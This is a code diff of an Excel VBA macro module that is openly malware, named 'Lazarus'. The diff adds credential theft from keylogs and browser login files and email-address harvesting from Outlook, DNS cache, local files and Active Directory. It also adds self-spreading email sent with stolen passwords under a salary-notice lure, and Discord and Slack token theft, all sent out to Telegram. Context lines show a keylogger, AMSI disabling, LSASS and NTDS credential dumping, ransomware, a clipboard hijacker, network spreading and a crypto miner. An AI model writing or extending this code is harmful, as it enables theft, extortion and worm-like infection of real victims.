@@ -1,4 +1,4 @@
-Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_OPERATIONAL"
+Attribute VB_Name = "LazarusModule"
 Option Explicit
 
 ' ========================
@@ -110,7 +110,6 @@ Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     dwFlags As Long
 End Type
 
-' Fixed MEMORYSTATUSEX using LongLong (64‑bit integers)
 Private Type MEMORYSTATUSEX
     dwLength As Long
     dwMemoryLoad As Long
@@ -135,6 +134,10 @@ Private gMachineID As String
 Private gFirstRun As Boolean
 Private gSelfPath As String
 
+' Collections for stolen credentials and email targets
+Private g_stolenCredentials As Object   ' Collection of "email|password"
+Private g_emailTargets As Object       ' Collection of email addresses
+
 ' ========================
 ' UTILITIES
 ' ========================
@@ -156,11 +159,9 @@ Function IsUserAdmin() As Boolean
 End Function
 
 Sub StealthSleep(ms As Long)
-    ' For sleeps >= 1000 ms, use Application.Wait (less CPU)
     If ms <= 0 Then Exit Sub
     If ms >= 1000 Then
-        Dim waitUntil As Date: waitUntil = Now + ms / 86400000#  ' ms to days
-        Application.Wait waitUntil
+        Application.Wait Now + ms / 86400000#
     Else
         Sleep ms
     End If
@@ -191,7 +192,6 @@ Fail:
     DownloadFile = False
 End Function
 
-' Helper to convert Currency (raw 64-bit) to LongLong
 Private Function CurToUlongLong(cur As Currency) As LongLong
     Dim ll As LongLong
     CopyMemory ll, cur, 8
@@ -209,7 +209,7 @@ Sub InstallPersistentLauncher()
     f.WriteLine "Set objExcel = CreateObject(""Excel.Application"")"
     f.WriteLine "objExcel.Visible = False"
     f.WriteLine "objExcel.Workbooks.Open """ & gSelfPath & """"
-    f.WriteLine "objExcel.Run ""Lazarus_Warhead2026_ULTIMATE_OPERATIONAL.AutoExec"""
+    f.WriteLine "objExcel.Run ""LazarusModule.AutoExec"""
     f.WriteLine "objExcel.Visible = False"
     f.Close
     SetAttr vbsPath, vbHidden + vbSystem
@@ -226,14 +226,6 @@ Function EncodeBase64(data() As Byte) As String
     xml.DataType = "bin.base64"
     xml.nodeTypedValue = data
     EncodeBase64 = Replace(xml.Text, vbCrLf, "")
-End Function
-
-Function DecodeBase64(b64 As String) As Byte()
-    On Error Resume Next
-    Dim xml As Object: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
-    xml.DataType = "bin.base64"
-    xml.Text = b64
-    DecodeBase64 = xml.nodeTypedValue
 End Function
 
 Function EncodeHex(b() As Byte) As String
@@ -272,7 +264,7 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ========================
-' POLLING KEYLOGGER (NON‑BLOCKING) – PUBLIC
+' POLLING KEYLOGGER (PUBLIC)
 ' ========================
 Public Sub PollingKeylogger()
     On Error Resume Next
@@ -302,7 +294,6 @@ Public Sub PollingKeylogger()
         End If
     Next i
     
-    ' Schedule next run in 50ms
     Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
 End Sub
 
@@ -345,7 +336,7 @@ Function GetKeyName(vKey As Integer) As String
 End Function
 
 ' ========================
-' EVASION (fixed MEMORYSTATUSEX and disk check)
+' EVASION
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
@@ -353,14 +344,12 @@ Function IsSandbox() As Boolean
     GlobalMemoryStatusEx memInfo
     If memInfo.ullTotalPhys < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
-    ' Fixed disk check – handle missing C:\ gracefully
     Dim freeBytes As Currency, totalBytes As Currency
     Dim ret As Long
     ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
     Dim totalBytesLL As LongLong
     If ret = 0 Then
-        ' Could not query C: – assume not sandbox (or skip check)
-        totalBytesLL = 128 * 1024 * 1024 * 1024   ' Assume large enough
+        totalBytesLL = 128 * 1024 * 1024 * 1024
     Else
         totalBytesLL = CurToUlongLong(totalBytes)
     End If
@@ -390,7 +379,6 @@ End Function
 
 Sub PatchAMSI()
     On Error Resume Next
-    ' Registry‑based method (safe, works on all Windows)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
@@ -487,7 +475,6 @@ Sub ExtractHashesFromNTDS()
     Dim systemPath As String: systemPath = GetTempDir() & "SYSTEM"
     If Not FileExists(ntdsPath) Or Not FileExists(systemPath) Then Exit Sub
     
-    ' Try PowerShell with ActiveDirectory module
     Dim psScript As String
     psScript = "Import-Module ActiveDirectory -ErrorAction SilentlyContinue;" & vbCrLf & _
                "if (Get-Command Get-ADReplAccount -ErrorAction SilentlyContinue) {" & vbCrLf & _
@@ -514,7 +501,6 @@ Sub ExtractHashesFromNTDS()
     If output <> "" And output <> "NO_HASHES" And output <> "NO_MODULE" Then
         SendToTelegramChunked "NTDS_HASHES|" & output
     Else
-        ' Fallback: exfiltrate raw files (Base64)
         Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
         stream.Type = 1: stream.Open: stream.LoadFromFile ntdsPath
         Dim data() As Byte: data = stream.Read: stream.Close
@@ -528,7 +514,7 @@ Sub ExtractHashesFromNTDS()
 End Sub
 
 ' ========================
-' CREDENTIAL THEFT
+' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers)
 ' ========================
 Sub DumpLSASS()
     On Error Resume Next
@@ -550,17 +536,14 @@ Sub DumpLSASS()
     If pid = 0 Then Exit Sub
     Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    ' Try comsvcs first (works on older systems)
     wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
     StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(dumpPath) Then
-        ' Fallback: download procdump
         Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
         If DownloadFile("https://live.sysinternals.com/procdump.exe", procdumpPath) Then
             wsh.Run procdumpPath & " -accepteula -ma " & pid & " " & dumpPath, 0, True
             StealthSleep 5000
-            ' Delete procdump.exe after use
             If fso.FileExists(procdumpPath) Then Kill procdumpPath
         End If
     End If
@@ -684,7 +667,298 @@ Sub StealAllCredentials()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM) – FIXED ERROR HANDLING
+' EXTRACT CREDENTIALS FROM KEYLOG AND BROWSER FILES
+' ========================
+Private Sub ExtractCredentialsFromKeylog()
+    On Error Resume Next
+    Dim keylogPath As String: keylogPath = GetTempDir() & "keylog.txt"
+    If Not FileExists(keylogPath) Then Exit Sub
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim ts As Object: Set ts = fso.OpenTextFile(keylogPath, 1)
+    Dim content As String: content = ts.ReadAll
+    ts.Close
+    
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[=:]\s*(\S+)"
+    regex.Global = True
+    regex.IgnoreCase = True
+    Dim matches As Object: Set matches = regex.Execute(content)
+    Dim m As Object
+    For Each m In matches
+        Dim subMatches As Variant: subMatches = m.SubMatches
+        If UBound(subMatches) >= 1 Then
+            g_stolenCredentials.Add subMatches(0) & "|" & subMatches(1)
+            SendToTelegram "STOLEN_CRED|" & subMatches(0) & "|" & subMatches(1)
+        End If
+    Next
+End Sub
+
+Private Sub ExtractCredentialsFromBrowserLoginData()
+    On Error Resume Next
+    Dim localAppData As String: localAppData = Environ("LOCALAPPDATA")
+    Dim chromeLogin As String: chromeLogin = localAppData & "\Google\Chrome\User Data\Default\Login Data"
+    Dim edgeLogin As String: edgeLogin = localAppData & "\Microsoft\Edge\User Data\Default\Login Data"
+    If FileExists(chromeLogin) Then
+        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1: stream.Open: stream.LoadFromFile chromeLogin
+        Dim data() As Byte: data = stream.Read: stream.Close
+        SendToTelegramChunked "BROWSER_LOGIN_DATA|CHROME|" & EncodeBase64(data)
+    End If
+    If FileExists(edgeLogin) Then
+        stream.Open: stream.LoadFromFile edgeLogin
+        data = stream.Read: stream.Close
+        SendToTelegramChunked "BROWSER_LOGIN_DATA|EDGE|" & EncodeBase64(data)
+    End If
+End Sub
+
+Private Sub ExtractAllCredentials()
+    ExtractCredentialsFromKeylog
+    ExtractCredentialsFromBrowserLoginData
+End Sub
+
+' ========================
+' HARVEST EMAIL TARGETS
+' ========================
+Private Sub HarvestFromOutlookContacts()
+    On Error Resume Next
+    Dim outlookApp As Object: Set outlookApp = CreateObject("Outlook.Application")
+    If outlookApp Is Nothing Then Exit Sub
+    Dim mapi As Object: Set mapi = outlookApp.GetNamespace("MAPI")
+    If mapi Is Nothing Then Exit Sub
+    Dim contacts As Object: Set contacts = mapi.GetDefaultFolder(10).Items
+    Dim contact As Object
+    For Each contact In contacts
+        If contact.Email1Address <> "" Then
+            g_emailTargets.Add contact.Email1Address
+        End If
+    Next
+End Sub
+
+Private Sub HarvestFromDNSCache()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim dnsFile As String: dnsFile = GetTempDir() & "dns.txt"
+    wsh.Run "ipconfig /displaydns > """ & dnsFile & """", 0, True
+    StealthSleep 2000
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(dnsFile) Then Exit Sub
+    Dim ts As Object: Set ts = fso.OpenTextFile(dnsFile, 1)
+    Dim content As String: content = ts.ReadAll
+    ts.Close
+    Kill dnsFile
+    
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "([a-zA-Z0-9.-]+\.(com|org|net|edu|gov))"
+    regex.Global = True
+    Dim matches As Object: Set matches = regex.Execute(content)
+    Dim domains As New Collection
+    Dim m As Object
+    For Each m In matches
+        On Error Resume Next
+        domains.Add m.Value, m.Value
+    Next
+    Dim d As Variant
+    For Each d In domains
+        g_emailTargets.Add "admin@" & d
+        g_emailTargets.Add "it@" & d
+        g_emailTargets.Add "support@" & d
+        g_emailTargets.Add "hr@" & d
+        g_emailTargets.Add "finance@" & d
+    Next
+End Sub
+
+Private Sub HarvestFromLocalFiles()
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim folders As Variant: folders = Array(Environ("USERPROFILE"), GetTempDir())
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b"
+    regex.Global = True
+    Dim folder As Variant
+    For Each folder In folders
+        If Not fso.FolderExists(folder) Then GoTo NextFolder
+        Dim file As Object
+        For Each file In fso.GetFolder(folder).Files
+            Dim ext As String: ext = LCase(fso.GetExtensionName(file.Name))
+            If ext = "txt" Or ext = "eml" Or ext = "msg" Or ext = "docx" Or ext = "xlsx" Or ext = "pdf" Then
+                On Error Resume Next
+                Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+                Dim content As String: content = ts.ReadAll
+                ts.Close
+                Dim matches As Object: Set matches = regex.Execute(content)
+                Dim m As Object
+                For Each m In matches
+                    g_emailTargets.Add m.Value
+                Next
+            End If
+        Next
+NextFolder:
+    Next
+End Sub
+
+Private Sub HarvestFromActiveDirectory()
+    On Error Resume Next
+    Dim psFile As String: psFile = GetTempDir() & "ad.ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+    f.WriteLine "Get-ADUser -Filter * | Select-Object -ExpandProperty UserPrincipalName"
+    f.Close
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & GetTempDir() & "ad.txt""", 0, True
+    StealthSleep 5000
+    If fso.FileExists(GetTempDir() & "ad.txt") Then
+        Dim ts As Object: Set ts = fso.OpenTextFile(GetTempDir() & "ad.txt", 1)
+        Dim line As String
+        Do While Not ts.AtEndOfStream
+            line = ts.ReadLine
+            If InStr(line, "@") > 0 Then g_emailTargets.Add line
+        Loop
+        ts.Close
+        Kill GetTempDir() & "ad.txt"
+    End If
+    Kill psFile
+End Sub
+
+Private Sub HarvestAllEmailTargets()
+    On Error Resume Next
+    Set g_emailTargets = New Collection
+    HarvestFromOutlookContacts
+    HarvestFromDNSCache
+    HarvestFromLocalFiles
+    HarvestFromActiveDirectory
+    SendToTelegram "EMAIL_TARGETS_HARVESTED|COUNT=" & g_emailTargets.Count
+End Sub
+
+' ========================
+' SEND EMAIL USING STOLEN CREDENTIALS (CDO)
+' ========================
+Private Function SendEmailWithCredential(cred As String, toEmail As String, attachmentPath As String) As Boolean
+    On Error GoTo Fail
+    Dim parts As Variant: parts = Split(cred, "|")
+    If UBound(parts) < 1 Then Exit Function
+    Dim username As String: username = parts(0)
+    Dim password As String: password = parts(1)
+    Dim domain As String
+    If InStr(username, "@") > 0 Then
+        domain = Mid(username, InStr(username, "@") + 1)
+    Else
+        domain = ""
+    End If
+    Dim smtpServer As String
+    Select Case LCase(domain)
+        Case "gmail.com": smtpServer = "smtp.gmail.com"
+        Case "outlook.com", "hotmail.com": smtpServer = "smtp-mail.outlook.com"
+        Case "yahoo.com": smtpServer = "smtp.mail.yahoo.com"
+        Case "office365.com": smtpServer = "smtp.office365.com"
+        Case Else: smtpServer = "smtp." & domain
+    End Select
+    If smtpServer = "" Then Exit Function
+    
+    Dim msg As Object: Set msg = CreateObject("CDO.Message")
+    Dim config As Object: Set config = CreateObject("CDO.Configuration")
+    Dim fields As Object: Set fields = config.Fields
+    With fields
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = smtpServer
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = username
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = password
+        .Update
+    End With
+    msg.Configuration = config
+    msg.From = username
+    msg.To = toEmail
+    msg.Subject = "Salary Deduction Notice"
+    msg.TextBody = "Dear employee, please review the attached document."
+    msg.AddAttachment attachmentPath
+    msg.Send
+    SendEmailWithCredential = True
+    Exit Function
+Fail:
+    SendEmailWithCredential = False
+End Function
+
+Private Sub WildfireEmailPropagation()
+    On Error Resume Next
+    If g_stolenCredentials Is Nothing Then Exit Sub
+    If g_stolenCredentials.Count = 0 Then Exit Sub
+    If g_emailTargets Is Nothing Then Exit Sub
+    Dim exePath As String: exePath = gSelfPath
+    Dim sentCount As Integer: sentCount = 0
+    Dim cred As Variant
+    For Each cred In g_stolenCredentials
+        Dim target As Variant
+        For Each target In g_emailTargets
+            If SendEmailWithCredential(cred, target, exePath) Then
+                sentCount = sentCount + 1
+                SendToTelegram "EMAIL_SENT|" & Split(cred, "|")(0) & " -> " & target
+                StealthSleep 1000
+            End If
+        Next
+    Next
+    SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount
+End Sub
+
+' ========================
+' DISCORD TOKEN THEFT
+' ========================
+Private Sub DiscordPropagation()
+    On Error Resume Next
+    Dim appData As String: appData = Environ("APPDATA")
+    Dim ldbPath As String: ldbPath = appData & "\discord\Local Storage\leveldb"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(ldbPath) Then Exit Sub
+    Dim file As Object
+    For Each file In fso.GetFolder(ldbPath).Files
+        If LCase(fso.GetExtensionName(file.Name)) = "ldb" Then
+            Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+            Dim content As String: content = ts.ReadAll
+            ts.Close
+            Dim tokenPos As Long: tokenPos = InStr(1, content, """token""", vbTextCompare)
+            If tokenPos > 0 Then
+                Dim startPos As Long: startPos = InStr(tokenPos + 8, content, """", vbTextCompare) + 1
+                Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
+                If startPos > 0 And endPos > startPos Then
+                    Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                    If Len(token) > 20 Then SendToTelegram "DISCORD_TOKEN|" & token
+                End If
+            End If
+        End If
+    Next
+End Sub
+
+' ========================
+' SLACK TOKEN THEFT
+' ========================
+Private Sub SlackPropagation()
+    On Error Resume Next
+    Dim appData As String: appData = Environ("APPDATA")
+    Dim slackPath As String: slackPath = appData & "\Slack\storage"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(slackPath) Then Exit Sub
+    Dim file As Object
+    For Each file In fso.GetFolder(slackPath).Files
+        If LCase(fso.GetExtensionName(file.Name)) = "json" Then
+            Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+            Dim content As String: content = ts.ReadAll
+            ts.Close
+            Dim tokenPos As Long: tokenPos = InStr(1, content, """token"":""", vbTextCompare)
+            If tokenPos > 0 Then
+                Dim startPos As Long: startPos = tokenPos + 9
+                Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
+                If endPos > startPos Then
+                    Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                    If Len(token) > 10 Then SendToTelegram "SLACK_TOKEN|" & token
+                End If
+            End If
+        End If
+    Next
+End Sub
+
+' ========================
+' RANSOMWARE (AES-GCM)
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -820,15 +1094,14 @@ Sub RunRansomware()
 End Sub
 
 ' ========================
-' CLIPBOARD HIJACK (NON‑BLOCKING) – FIXED UNICODE
+' CLIPBOARD HIJACK (PUBLIC)
 ' ========================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next
     Dim text As String
     Static lastText As String
     If OpenClipboard(0) Then
-        ' Try Unicode first
-        Dim hData As LongPtr: hData = GetClipboardData(13)   ' CF_UNICODETEXT
+        Dim hData As LongPtr: hData = GetClipboardData(13)
         If hData Then
             Dim pData As LongPtr: pData = GlobalLock(hData)
             If pData Then
@@ -836,8 +1109,7 @@ Public Sub ClipboardMonitorLoop()
                 GlobalUnlock hData
             End If
         Else
-            ' Fallback to ANSI (converted via MultiByteToWideChar)
-            hData = GetClipboardData(1)   ' CF_TEXT
+            hData = GetClipboardData(1)
             If hData Then
                 pData = GlobalLock(hData)
                 If pData Then
@@ -869,7 +1141,6 @@ Private Function PointerToUnicodeString(ByVal pStr As LongPtr) As String
     If pStr = 0 Then Exit Function
     Dim lenStr As Long: lenStr = lstrlenW(pStr)
     If lenStr = 0 Then Exit Function
-    ' Use null-character buffer (more efficient)
     Dim buf As String: buf = String(lenStr, vbNullChar)
     CopyMemory ByVal buf, ByVal pStr, lenStr * 2
     PointerToUnicodeString = buf
@@ -946,7 +1217,6 @@ Sub SMBPropagation()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     Dim out As String: out = wsh.Exec("net view").StdOut.ReadAll
-    ' Early exit if no shares found
     If out = "" Or InStr(LCase(out), "no entries") > 0 Then Exit Sub
     Dim lines As Variant: lines = Split(out, vbCrLf)
     Dim line As Variant
@@ -965,10 +1235,6 @@ Sub SMBPropagation()
         End If
     Next
 End Sub
-
-' ========================
-' EMAIL PROPAGATION – REMOVED (Gmail blocks basic auth)
-' ========================
 
 ' ========================
 ' CHROME REMOTE DESKTOP
@@ -1012,12 +1278,12 @@ Sub DeployMiner()
 End Sub
 
 ' ========================
-' SOCIAL ENGINEERING HTA
+' SOCIAL ENGINEERING HTA (TIMELESS, GLOBAL)
 ' ========================
 Sub DeploySocialEngineeringUI()
     On Error Resume Next
     Dim html As String
-    html = "<html><head><title>Salary Deduction Notice #SD-2026-0405</title>" & _
+    html = "<html><head><title>Important Salary Notice</title>" & _
            "<HTA:APPLICATION ID='objLazarus' APPLICATIONNAME='Lazarus' WINDOWSTATE='minimize' SHOWINTASKBAR='no'/>" & _
            "<script language='VBScript'>" & _
            "  Sub Window_OnLoad" & _
@@ -1033,9 +1299,9 @@ Sub DeploySocialEngineeringUI()
            ".warning{background:#fff3cd;border:1px solid #ffc107;color:#856404;padding:15px;border-radius:4px;margin:20px 0}" & _
            "</style></head><body>" & _
            "<div class='container'><div class='header'><h1 class='logo'>GLOBAL PAYROLL SERVICES</h1><p>Confidential Employee Notice</p></div>" & _
-           "<h2>SALARY DEDUCTION NOTICE #SD-2026-0405</h2>" & _
+           "<h2>SALARY DEDUCTION NOTICE</h2>" & _
            "<p><strong>Dear Employee,</strong></p>" & _
-           "<p>A mandatory deduction of <strong>$487.33</strong> has been applied to your January 2026 payroll for 'Regulatory Compliance Fee'.</p>" & _
+           "<p>A mandatory deduction has been applied to your payroll for 'Regulatory Compliance Fee'.</p>" & _
            "<div class='warning'><strong>SECURITY NOTICE:</strong> This document contains confidential payroll information. Click 'OK' to view details.</div>" & _
            "</div></body></html>"
     Dim uiPath As String: uiPath = GetTempDir() & "salary_notice_" & Timer & ".hta"
@@ -1118,9 +1384,9 @@ Sub PersistAll()
 End Sub
 
 ' ========================
-' MAIN EXECUTION (NON‑BLOCKING, EFFICIENT WAIT)
+' MAIN ENTRY POINT (PUBLIC)
 ' ========================
-Sub AutoExec()
+Public Sub AutoExec()
     On Error GoTo ErrorHandler
     If gRunFlag = "RUN" Then Exit Sub
     gRunFlag = "RUN"
@@ -1128,7 +1394,6 @@ Sub AutoExec()
     gSelfPath = ThisWorkbook.FullName
     gKeylogFile = GetTempDir() & "keylog.txt"
     
-    ' First run: enable macro settings
     If gFirstRun = False Then
         gFirstRun = True
         Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
@@ -1147,10 +1412,7 @@ Sub AutoExec()
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
-    ' Install persistence
     PersistAll
-    
-    ' Start keylogger
     Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
     
     If IsDomainController() Then
@@ -1162,18 +1424,27 @@ Sub AutoExec()
         DeployMiner
         USBPropagation
         SMBPropagation
-        ' Email propagation removed
+        
+        ' Initialize collections
+        Set g_stolenCredentials = New Collection
+        Set g_emailTargets = New Collection
+        
+        ' New advanced features
+        ExtractAllCredentials
+        HarvestAllEmailTargets
+        DiscordPropagation
+        SlackPropagation
+        WildfireEmailPropagation
         RunRansomware
         DeploySocialEngineeringUI
         Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
     End If
     
-    ' Hide Excel and keep it alive efficiently
     Application.Visible = False
     ThisWorkbook.Saved = True
     Do While True
         DoEvents
-        Application.Wait Now + TimeValue("00:00:01")   ' 1 second pause – reduces CPU
+        Application.Wait Now + TimeValue("00:00:01")
     Loop
     Exit Sub
 ErrorHandler:
